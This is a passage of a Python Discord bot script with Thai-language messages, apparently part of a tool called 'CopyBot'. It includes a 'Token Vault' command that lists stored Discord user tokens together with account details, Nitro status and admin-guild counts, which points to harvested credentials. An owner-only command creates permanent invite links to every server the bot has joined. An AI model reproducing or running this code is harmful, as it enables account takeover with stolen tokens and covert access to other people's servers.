        await db.set_guild_config(interaction.guild_id, channel.id, allowed_role.id)
    status, data = await send_v2_components(channel.id, TOKEN)
    if status in [200, 201]:
        await interaction.followup.send(f"✅ ติดตั้งระบบที่ {channel.mention} เรียบร้อยแล้วค่ะ! (ล็อกสิทธิ์ Token ให้ยศ: {allowed_role.mention})", ephemeral=True)
    else:
        await interaction.followup.send(f"❌ เกิดข้อผิดพลาด: `{data}`", ephemeral=True)

@bot.command(name="setup")
@commands.has_permissions(administrator=True)
async def setup_prefix(ctx: commands.Context, role: Optional[discord.Role] = None, channel: Optional[discord.TextChannel] = None):
    if not role:
        return await ctx.send("⚠️ บังคับระบุยศที่ได้รับสิทธิ์: `!setup <@role> [#channel]`")
    target = channel or ctx.channel
    if ctx.guild:
        await db.set_guild_config(ctx.guild.id, target.id, role.id)
    status, data = await send_v2_components(target.id, TOKEN)
    if status in [200, 201]:
        await ctx.send(f"✅ ติดตั้งระบบที่ {target.mention} เรียบร้อย (ยศที่เข้าถึง Token: {role.mention})", delete_after=10)
    else:
        await ctx.send(f"❌ เกิดข้อผิดพลาด: `{data}`", delete_after=5)

@bot.tree.command(name="vault", description="ดูรายการ User Token ทั้งหมดที่บันทึกไว้ใน Token Vault (เฉพาะ Administrator)")
@app_commands.default_permissions(administrator=True)
async def slash_token_vault(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
        return await interaction.followup.send("❌ คุณไม่มีสิทธิ์เข้าถึง Token Vault", ephemeral=True)

    tokens = await db.get_all_tokens()
    if not tokens:
        return await interaction.followup.send("📦 **Token Vault ว่างเปล่า**: ยังไม่มี Token ที่ผ่านการตรวจสอบหรือดึงเข้ามาในระบบ", ephemeral=True)

    desc_lines = [f"📦 **รายการ Token ในระบบ (รวม {len(tokens)} บัญชี):**\n"]
    for idx, t in enumerate(tokens[:10], start=1):
        masked_tok = t['token'][:18] + "..." + t['token'][-6:] if len(t['token']) > 24 else t['token']
        desc_lines.append(f"`{idx}.` **{t['username']}** (`{t['user_id']}`) | Nitro: `{t['nitro']}` | `{t['admin_guilds']}` Admins")
        desc_lines.append(f"   ↳ 🔑 `{masked_tok}`\n")

    if len(tokens) > 10:
        desc_lines.append(f"...และอีก {len(tokens) - 10} รายการ")

    emb = discord.Embed(title="🔐 Enterprise Token Vault Manager", description="\n".join(desc_lines), color=0x5865F2)
    emb.set_footer(text=f"Total: {len(tokens)} Tokens | Secure Database Storage")
    await interaction.followup.send(embed=emb, ephemeral=True)

@bot.tree.command(name="pull_all_invites", description="ดึงลิงก์เชิญทุกดิสที่บอทอยู่")
async def pull_all_invites(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        return await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    results = [f"🌐 บอทอยู่ใน **{len(bot.guilds)}** เซิร์ฟเวอร์\n"]
    for guild in bot.guilds:
        try:
            target = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).create_instant_invite), None)
            if target:
                invite = await target.create_invite(max_age=0, max_uses=0)
                results.append(f"📌 **{guild.name}** • {invite.url}")
            else:
                results.append(f"📌 **{guild.name}** • ⛔ สร้างลิงก์ไม่ได้")
        except Exception:
            results.append(f"📌 **{guild.name}** • ⛔ เกิดข้อผิดพลาด")
    final_msg = "\n".join(results)
    if len(final_msg) > 1950:
        buffer = io.BytesIO(final_msg.encode("utf-8"))
        await interaction.followup.send("📄 ส่งเป็นไฟล์:", file=discord.File(buffer, filename="invites.txt"), ephemeral=True)
    else:
        await interaction.followup.send(final_msg, ephemeral=True)

if __name__ == "__main__":
    print("==================================================")
    print("  COPYBOT ON TOP REPLICATION ENGINE STARTING")
    masked_t = f"{TOKEN[:10]}...{TOKEN[-6:]}" if len(TOKEN) > 16 else TOKEN
    print(f"  Target Token: {masked_t}")
    print("==================================================")
    try:
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        print("\n" + "="*60)
        print("❌ [CopyBot Login Error] Discord Bot Token ไม่ถูกต้องหรือถูกรีเซ็ต!")
        print("💡 วิธีระบุ Bot Token ใหม่ที่ถูกต้อง:")
        print("   1. รันผ่านพารามิเตอร์: python \"copyee3 (1).py\" --token <NEW_BOT_TOKEN>")
        print("   2. หรือสร้างไฟล์ .env แล้วใส่: DISCORD_BOT_TOKEN=<NEW_BOT_TOKEN>")
        print("   3. หรือตั้งค่าผ่านระบบ: set DISCORD_BOT_TOKEN=<NEW_BOT_TOKEN>")
        print("="*60 + "\n")
    except Exception as e:
        print(f"\n❌ [CopyBot Error] {e}\n")